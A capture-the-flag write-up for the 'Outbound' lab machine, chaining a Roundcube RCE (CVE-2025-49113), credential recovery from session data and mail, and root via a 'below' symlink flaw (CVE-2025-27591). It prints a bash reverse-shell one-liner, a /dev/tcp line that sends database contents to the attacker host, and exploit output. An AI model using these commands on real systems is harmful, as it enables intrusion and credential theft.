# Outbound

## Recon

> **Machine Information**: As is common in real life pentests, you will start the Outbound box with credentials for the following account `tyler / LhKL1o9Nm3X2`

::: details nmap_scan.log
```log
Open 10.10.11.77:22
Open 10.10.11.77:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.77

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![Writeup.png](/assets/pentest/htb/outbound/Writeup.png)

### CVE‑2025‑49113

**About** tells us that version is **1.6.10** which should be vulnerable to recent [CVE‑2025‑49113 – Post‑Auth Remote Code Execution in Roundcube via PHP Object Deserialization](https://www.offsec.com/blog/cve-2025-49113/)

![Writeup-1.png](/assets/pentest/htb/outbound/Writeup-1.png)

POC: [CVE-2025-49113-exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit)

```bash
└─$ curl -LOs https://raw.githubusercontent.com/hakaioffsec/CVE-2025-49113-exploit/refs/heads/main/CVE-2025-49113.php
└─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.37/4444 0>&1"'
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
---
└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.77:38764.
bash: cannot set terminal process group (256): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

Check RoundCube config for database creds
```bash
www-data@mail:/var/www/html/roundcube/config$ grep '^\$' ./config.inc.php
$config = [];
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
$config['imap_host'] = 'localhost:143';
$config['smtp_host'] = 'localhost:587';
$config['smtp_user'] = '%u';
$config['smtp_pass'] = '%p';
$config['support_url'] = '';
$config['product_name'] = 'Roundcube Webmail';
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
$config['plugins'] = [
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

### MySQL

```bash
www-data@mail:/var/www/html/roundcube/config$ mysql -u 'roundcube' -p'RCDBPass2025' roundcube -e 'SHOW TABLES;'
Tables_in_roundcube
cache
cache_index
cache_messages
cache_shared
cache_thread
collected_addresses
contactgroupmembers
contactgroups
contacts
dictionary
filestore
identities
responses
searches
session
system
users

www-data@mail:/tmp$ echo;mysql -u 'roundcube' -p'RCDBPass2025' roundcube -Nse "SELECT * FROM users"

1       jacob   localhost       2025-06-07 13:55:18     2025-07-27 15:30:26     2025-07-27 13:57:52     1       en_US   a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel     localhost       2025-06-08 12:04:51     2025-06-08 13:29:05     2025-07-27 15:13:12     1       en_US   a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3       tyler   localhost       2025-06-08 13:28:55     2025-07-27 15:37:50     2025-07-27 15:26:32     1       en_US   a:2:{s:11:"client_hash";s:16:"QEeO6K5JGZyVwwDT";i:0;b:0;}
```

No credentials in user...

Something in `sessions` table tho, save it for testing.
```bash
www-data@mail:/tmp$ echo;mysql -u 'roundcube' -p'RCDBPass2025' roundcube -Nse "SELECT vars FROM session" > /dev/tcp/10.10.14.37/4444
---
└─$ listen > sessions.b64
```

This took some time, but Roundcube has custom **[unserialize](https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube_session.php#L521)** method, I just pasted into script and decoded all the blobs.
```php
<?php

// https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube_session.php#L521
function rubic_unserialize($str) { $str = (string) $str; $endptr = strlen($str); $p = 0; $serialized = ''; $items = 0; $level = 0; while ($p < $endptr) { $q = $p; while ($str[$q] != '|') { if (++$q >= $endptr) { break 2; } } if ($str[$p] == '!') { $p++; $has_value = false; } else { $has_value = true; } $name = substr($str, $p, $q - $p); $q++; $serialized .= 's:' . strlen($name) . ':"' . $name . '";'; if ($has_value) { while (true) { $p = $q; switch (strtolower($str[$q])) { case 'n': case 'b': case 'i': case 'd': do { $q++; } while (($q < $endptr) && ($str[$q] != ';')); $q++; $serialized .= substr($str, $p, $q - $p); if ($level == 0) { break 2; } break; case 'r': $q += 2; $id = ''; for (; ($q < $endptr) && ($str[$q] != ';'); $q++) { $id .= $str[$q]; } $q++; $serialized .= 'R:' . (intval($id) + 1) . ';'; if ($level == 0) { break 2; } break; case 's': $q += 2; $length = ''; for (; ($q < $endptr) && ($str[$q] != ':'); $q++) { $length .= $str[$q]; } $q += 2; $q += (int) $length + 2; $serialized .= substr($str, $p, $q - $p); if ($level == 0) { break 2; } break; case 'a': case 'o': do { $q++; } while ($q < $endptr && $str[$q] != '{'); $q++; $level++; $serialized .= substr($str, $p, $q - $p); break; case '}': $q++; $serialized .= substr($str, $p, $q - $p); if (--$level == 0) { break 2; } break; default: return false; } } } else { $serialized .= 'N;'; $q += 2; } $items++; $p = $q; } return unserialize('a:' . $items . ':{' . $serialized . '}'); }

$lines = file('sessions.b64', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

foreach ($lines as $i => $line) {
    $decoded = rubic_unserialize(base64_decode($line));
    $filtered = [];
    foreach ($decoded as $key => $value) {
        if (is_string($value) || is_int($value) || is_float($value)) {
            $filtered[$key] = $value;
        }
    }

    if (!isset($filtered['username']) || $filtered['username'] == 'tyler') {
        continue;
    }

    print_r($filtered);
    echo "- - - - - - - - - - - - - - - - - -\n";
}

?>
```

```bash
└─$ php /media/sf_VBoxShare/index.php
Array
(
    [language] => en_US
    [imap_delimiter] => /
    [user_id] => 1
    [username] => jacob
    [storage_host] => localhost
    [storage_port] => 143
    [password] => dKrzgoCOX+/fToNz6fft5JXjhIAJNQGd
    [login_time] => 1753630226
    [timezone] => America/New_York
    [auth_secret] => VHYGYMjaOiPks1fvlQNs1ZrRY2
    [request_token] => K0qzDg44XCVZ3XYcCDOXG5IDddjjcYIa
    [task] => mail
    [imap_host] => localhost
    [mbox] => INBOX/jacob
    [sort_col] =>
    [sort_order] => DESC
    [list_mod_seq] => 4
    [addressbooks_count] => 3
    [addressbooks_count_writeable] => 1
    [contactcountdisplay] => fromtoshort
    [page] => 1
)
- - - - - - - - - - - - - - - - - -
```

We can then decrypt the password using RoudCube again
```bash
www-data@mail:/var/www/html/roundcube/bin$ ./decrypt.sh 'dKrzgoCOX+/fToNz6fft5JXjhIAJNQGd'
595mO8DmwGeD
```

## SSH 

If we try to SSH with this password we fail.
```bash
└─$ sshpass -p '595mO8DmwGeD' ssh jacob@10.10.11.77
Warning: Permanently added '10.10.11.77' (ED25519) to the list of known hosts.
Permission denied, please try again.
```

However we can `su` locally
```bash
www-data@mail:/var/www/html/roundcube/bin$ su - jacob
Password: 595mO8DmwGeD
script /dev/null -qc /bin/bash
jacob@mail:~$ id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob)
```

There's no SSH config? Something is not right...
```bash
jacob@mail:~$ ls /etc/ss*
certs  openssl.cnf  private
```

```bash
jacob@mail:~$ find -type f -readable -ls
find -type f -readable -ls
      988      4 -rw-r--r--   1 jacob    jacob         807 Mar 31  2024 ./.profile
     1002      4 -rw-------   1 jacob    jacob         528 Jun  7 13:59 ./mail/Trash
      995      4 -rw-------   1 jacob    jacob        1604 Jun  7 13:59 ./mail/.imap/Trash/dovecot.index.cache
      996      4 -rw-------   1 jacob    jacob        1288 Jun  7 13:59 ./mail/.imap/Trash/dovecot.index.log
     1000      4 -rw-------   1 jacob    jacob          72 Jun  7 13:59 ./mail/.imap/dovecot.mailbox.log
      992      4 -rw-------   1 jacob    jacob        3708 Jul 26 16:17 ./mail/.imap/INBOX/dovecot.index.cache
      993      8 -rw-------   1 jacob    jacob        4172 Jul 26 16:17 ./mail/.imap/INBOX/dovecot.index.log
      999      4 -rw-------   1 jacob    jacob        2844 Jul  9 12:41 ./mail/.imap/dovecot.list.index.log
      997      4 -rw-------   1 jacob    jacob           8 Jul  9 12:41 ./mail/.imap/dovecot-uidvalidity
      998      0 -r--r--r--   1 jacob    jacob           0 Jun  7 13:59 ./mail/.imap/dovecot-uidvalidity.684445b1
     1001      4 -rw-------   1 jacob    jacob          11 Jun  7 13:59 ./mail/.subscriptions
   131137      4 -rw-rw----   1 jacob    jacob        2276 Jul  9 12:41 ./mail/INBOX/.imap/jacob/dovecot.index.cache
   131136      4 -rw-rw----   1 jacob    jacob         592 Jul  9 12:41 ./mail/INBOX/.imap/jacob/dovecot.index.log
   131132      4 -rw-rw----   1 jacob    jacob        1799 Jul  9 12:41 ./mail/INBOX/jacob
      986      4 -rw-r--r--   1 jacob    jacob         220 Mar 31  2024 ./.bash_logout
      987      4 -rw-r--r--   1 jacob    jacob        3771 Mar 31  2024 ./.bashrc
   131515      4 -rw-rw----   1 jacob    jacob         224 Jul 26 16:38 ./logs/tyler.log
   131517      4 -rw-rw----   1 jacob    jacob         508 Jul 26 16:38 ./logs/jacob.log
   131516      4 -rw-rw----   1 jacob    jacob         224 Jul 26 16:37 ./logs/mel.log
```

```bash
jacob@mail:~$ cat ./mail/INBOX/jacob; echo
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
To: jacob@outbound.htb
Subject: Important Update
...

Due to the recent change of policies your password has been changed.
Please use the following credentials to log into your account: gY4Wr3a1evp4
Remember to change your password when you next log into your account.
Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
...

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Alright, SSH worked
```bash
└─$ sshpass -p 'gY4Wr3a1evp4' ssh jacob@10.10.11.77
jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
```

Previous machine was a docker container so that's why there was no SSH.
```bash
jacob@mail:~$ ip -brief a s
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0@if4         UP             172.17.0.2/16
---
jacob@outbound:~$ ip -brief a s
lo               UNKNOWN        127.0.0.1/8
eth0             UP             10.10.11.77/23
docker0          UP             172.17.0.1/16
veth44769fc@if2  UP
```

### User.txt

```bash
jacob@outbound:~$ cat user.txt
0ab0e0b00905ac2c2e41c3a0df554fc4
```

## Privilege Escalation

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

**[below](https://github.com/facebookincubator/below)**: A time traveling resource monitor for modern Linux systems.

### CVE-2025-27591

Under security there's 1 disclosed vulnerability: [Incorrect Permission Assignment for Critical Resource in below](https://github.com/facebookincubator/below/security/advisories/GHSA-9mc5-7qhg-fp3w)

[CVE-2025-27591-PoC](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)

```bash
└─$ curl -LOs https://raw.githubusercontent.com/BridgerAlderson/CVE-2025-27591-PoC/refs/heads/main/exploit.py
└─$ serve
---
jacob@outbound:~$ curl 10.10.14.37/exploit.py -so /tmp/exploit.py
jacob@outbound:~$ python3 /tmp/exploit.py
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Jul 26 17:17:48.958 DEBG Starting up!
Jul 26 17:17:48.958 ERRO
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01753488000: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...
root@outbound:/home/jacob# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@outbound:/home/jacob# cat /root/root.txt
899ee89afd8c6851a859a4739a03f0c5
```